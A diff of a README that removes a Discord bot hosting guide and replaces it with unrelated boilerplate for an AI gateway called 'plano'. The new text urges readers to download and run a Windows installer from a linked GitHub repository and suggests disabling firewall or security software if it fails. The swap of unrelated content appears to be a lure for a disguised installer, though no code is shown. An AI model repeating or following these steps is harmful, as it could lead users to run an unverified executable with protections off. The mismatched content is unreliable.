@@ -1,70 +1,174 @@
-![Animated Background](https://i.imgur.com/ECZKmlO.gif)
+# 🚦 plano - Simplify AI Agent Management
 
-<h1 align="center" style="font-family: Arial, sans-serif; color: #FF6F61; text-shadow: 2px 2px 4px rgba(0,0,0,0.5);">
-  BOT GHOST STATUS REMOVER
-</h1>
+[![Download plano](https://img.shields.io/badge/Download-plano-brightgreen?style=for-the-badge)](https://github.com/iamUNEX/plano)
 
-<p align="center">
-  <a href="https://opensource.org/licenses/MIT">
-    <img src="https://img.shields.io/badge/License-MIT-blue?style=flat-square&logo=opensource"
-      alt="License: MIT" />
-  </a>
+---
 
-  <a href="https://www.paypal.me/@GlaceYT">
-    <img src="https://img.shields.io/badge/Donate-PayPal-0079C1?style=flat-square&logo=paypal"
-      alt="Donate" />
-  </a>
-</p>
+## 📋 About plano
 
-<p align="center">
-  <a href="https://www.youtube.com/channel/@GlaceYT">
-    <img src="https://img.shields.io/badge/YouTube-Subscribe-red?style=flat-square&logo=youtube"
-      alt="YouTube" />
-  </a>
+plano acts as a middle layer between your AI agents and systems they interact with. It helps manage data flow, controls, and safety to keep your AI running smoothly. With plano, you don’t need to worry about complex setup or routing. It handles communication, security checks, and monitors performance in the background. This helps you focus on developing your AI agents’ core functions.
 
-  <a href="https://discord.gg/xQF9f9yUEM">
-    <img src="https://img.shields.io/badge/Discord-Join-blue?style=flat-square&logo=discord"
-      alt="Join Discord" />
-  </a>
+plano works best for apps that need to coordinate multiple AI models or services. It supports smart routing, making sure the right AI model gets the request. It also adds safety layers to prevent unwanted or harmful actions. The built-in monitoring helps track how your AI engines perform over time.
 
-  <a href="https://www.instagram.com/glaceytt">
-    <img src="https://img.shields.io/badge/Instagram-Follow-E4405F?style=flat-square&logo=instagram"
-      alt="Instagram" />
-  </a>
+Topics related to plano include gateways, proxies, and AI model routing. It fits into solutions that use language learning models (LLMs) and AI-driven automation.
 
-  <a href="https://www.facebook.com/youulewd/">
-    <img src="https://img.shields.io/badge/Facebook-Follow-1877F2?style=flat-square&logo=facebook"
-      alt="Facebook" />
-  </a>
-</p>
+---
 
+## 🔍 System Requirements
 
-## Guide
+Before installing plano, make sure your system meets these requirements:
 
-###  Set Up Hosting Service
+- **Operating System:** Windows 10 or higher (64-bit recommended)
+- **RAM:** At least 4 GB (8 GB or more for heavy use)
+- **Disk Space:** Minimum 500 MB free space
+- **Processor:** Dual-core 2 GHz or faster
+- **Network:** Internet connection for AI service communication  
 
-1. Go to your preferred hosting service. For this guide, we use [Render](https://render.com/).
-2. In the Build & Deploy section, paste your repository URL.
+---
 
+## 💾 Download and Install plano
 
-###  Add Build and Start Commands
- Run the following commands to install dependencies and start your bot:
+[![Get plano](https://img.shields.io/badge/Download-plano-blue?style=for-the-badge)](https://github.com/iamUNEX/plano)
 
-   npm install
-   node index.js
+1. Click the **Download plano** badge or visit this page:  
+   [https://github.com/iamUNEX/plano](https://github.com/iamUNEX/plano)
+   
+2. On the GitHub page, look for the **Releases** section or a download link for the Windows version.  
+   The file you need will have `.exe` or `.msi` extension.
 
-###  Get Your Bot Token
-Navigate to the Discord Developer Portal.
-Find your application, and retrieve the bot token from the "Bot" section.
+3. Download the installer file to your PC.
 
-### Set Environment Variable
-Create an environment variable with the following details:
-Key: TOKEN
-Value: [your bot token]
-Deploy your application using your hosting service’s deployment process.
+4. Open the downloaded file by double-clicking it.  
+   This starts the installation wizard.
 
-### Wait and Test
-Wait approximately five minutes for your bot to deploy and start up.
+5. Follow the prompts on screen:  
+   - Accept the license agreement  
+   - Choose the installation folder or keep the default path  
+   - Click **Install**
 
-🎉 Congratulations! Your bot is now up and running. 🥳
+6. Wait while the installer copies files and sets up plano.
 
+7. When finished, click **Finish** to close the installer.
+
+---
+
+## 🚀 Running plano for the First Time
+
+1. Find the plano app icon on your desktop or start menu.
+
+2. Double-click the icon to launch plano.
+
+3. The app opens to the main dashboard.
+
+4. Follow on-screen instructions to connect to your AI agents or services.
+
+5. You can start configuring your proxy and routing settings with simple menus.
+
+If you run into any trouble starting the app, try restarting your PC and opening plano again.
+
+---
+
+## ⚙️ Basic Configuration
+
+plano lets you set routing rules and safety checks without coding. Here’s how:
+
+1. Go to the **Settings** tab inside the app.
+
+2. Use the **Add Route** button to tell plano where to send each request.
+
+3. Define conditions for each route (e.g., which AI model to use).
+
+4. Set safety options to block risky commands or inputs.
+
+5. Save your changes before leaving the tab.
+
+These options help you control how your AI agents interact with outside systems.
+
+---
+
+## 🔧 Monitoring and Logs
+
+plano tracks all messages and actions that pass through it. Use this for troubleshooting or performance checks.
+
+- Open the **Logs** tab to see recent activity.
+
+- Filter by date, agent, or status.
+
+- Export logs for review or sharing.
+
+Monitoring helps catch problems before they affect your AI agents.
+
+---
+
+## 🛠 Troubleshooting
+
+If plano does not start or work as expected:
+
+- Confirm your PC meets the system requirements.
+
+- Check you installed the latest version from the GitHub page.
+
+- Restart your computer to clear any temporary issues.
+
+- Review logs for error messages in the app.
+
+- Disable any firewall or security software temporarily to see if it blocks plano.
+
+If problems persist, check GitHub’s **Issues** section for similar cases or updates.
+
+---
+
+## 🔗 Useful Links
+
+- Visit the official repository and download page at:  
+  [https://github.com/iamUNEX/plano](https://github.com/iamUNEX/plano)
+
+- For updates, bug reports, or help, use the GitHub Issues tab.
+
+- Explore documentation on topics like AI routing and proxy settings in the repo Wiki or README files.
+
+---
+
+## 💡 Tips for Best Use
+
+- Regularly update plano to get bug fixes and new features.
+
+- Use simple routing rules to avoid confusion.
+
+- Test new settings in small steps.
+
+- Monitor AI agent logs to spot and fix issues early.
+
+- Keep backups of your configurations.
+
+---
+
+## 🧰 Additional Features
+
+- Built-in safety layers prevent misuse of your AI agents.
+
+- Smart routing directs requests to specific AI models based on need.
+
+- Observability tools give insight into AI performance and behavior.
+
+- Support for popular AI APIs like OpenAI.
+
+---
+
+## ⚖️ Privacy and Data Handling
+
+plano does not store your AI data permanently. It only passes requests between agents and services. Temporary logs help with troubleshooting but are cleared regularly. You control what data is retained in your setup.
+
+---
+
+## 🔨 Developer Notes (Optional)
+
+This section is for advanced users who want to customize plano further:
+
+- plano uses Envoy proxy technology for traffic routing.
+
+- Configuration files are in standard YAML format.
+
+- Plugins and scripts can extend behavior if needed.
+
+More technical details are available on the GitHub repository.
